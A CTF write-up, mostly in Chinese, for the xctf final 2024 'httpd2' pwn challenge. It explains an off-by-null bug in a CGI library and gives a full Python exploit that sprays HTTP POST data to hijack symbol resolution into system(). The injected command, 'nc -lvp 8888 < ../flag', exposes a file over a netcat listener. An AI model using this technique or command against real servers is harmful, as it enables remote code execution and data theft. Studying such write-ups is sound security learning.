---
data: 2024-07-20 16:31
challenge: httpd2
tags:
  - dlresolve
  - spary
---

> [!info]
> 题目本身不难，对于线下赛我认为工作量也是很合适的。针对动态链接的攻击非常有趣，是一道好题。
>
> 但是比赛期间我没有解出来（0 解），原因如下：
>
> 1. 题目存在两处漏洞，都是越界写。但是越界 buffer 的附近没有任何数据
> 2. 利用涉及喷射 - 命中的思路，线下赛期间感觉思路比较混乱
> 3. ~~此外就是被本地出了远程爆破半天出不来的 solo 题和虚拟机逆向题折磨得神志不清~~

## Analysis

cgi-bin 目录下一共给了三个文件，其中漏洞只有可能存在于 `libctfc.so`（因为另外两个都过于直白了），其中有用的洞是 `genCookie` 函数里的越界写 0：

```c
v4 = strlen(passwd);
sub_135A(dest, 1024LL, passwd, v4 + 1);
dest[v4] = 0;
```

<details>
<summary>**调试**</summary>

这种题目的调试我一般使用 gdbserver，直接在 docker 里面安装，替换 main.cgi 内容为 `gdbserver 0.0.0.0:1234 ./real.cgi` 即可调试，相关脚本见 [initgdb.sh](./bin/cgi-bin/initgdb.sh)。

</details>

## Exploitation

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

# cli_script()
# set_remote_libc("libc.so.6")
#
# io: tube = gift.io
# elf: ELF = gift.elf
# libc: ELF = gift.libc

context.log_level = "info"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

io = remote("127.0.0.1", 80)

while True:
    try:

        def get_payload(name, passwd, spary_payload):
            payload = b"POST /cgi-bin/main.cgi HTTP/1.1\r\n"
            payload += b"Host: localhost\r\n"
            payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
            payload += b"Connection: close\r\n"

            post_data = b"username=" + name + b"&passwd=" + passwd + spary_payload
            payload += f"Content-Length: {len(post_data)}\r\n".encode()
            payload += b"\r\n"
            payload += post_data
            payload += b"\r\n"
            return payload

        spary_payload = b""
        for i in range(0xC0 + 0x10, 0x5000, 8):
            if ((i - 8) & 0xFFF) == 0xEA0:
                spary_payload += b"&" + b"a" * 0x69 + b"%00system%00"
            else:
                spary_payload += b"&x"

        distance = 0x125F48
        payload = get_payload(
            b"nc -lvp 8888 < ../flag", b"a" * (distance + 2), spary_payload
        )
        s(payload)

        data = rl()
        print(data)
        assert b"500" not in data()

        ia()
    except:
        io.close()
        io = remote("127.0.0.1", 80)


# buf = 0x7ffff7e96300
# target_strtab = 0x7ffff7fbc248
```

---

## References

\[1\] [Official WP - xctf final 2024 httpd2 writeup](https://forum.butian.net/share/3123) . _[noir](https://forum.butian.net/people/32623)_
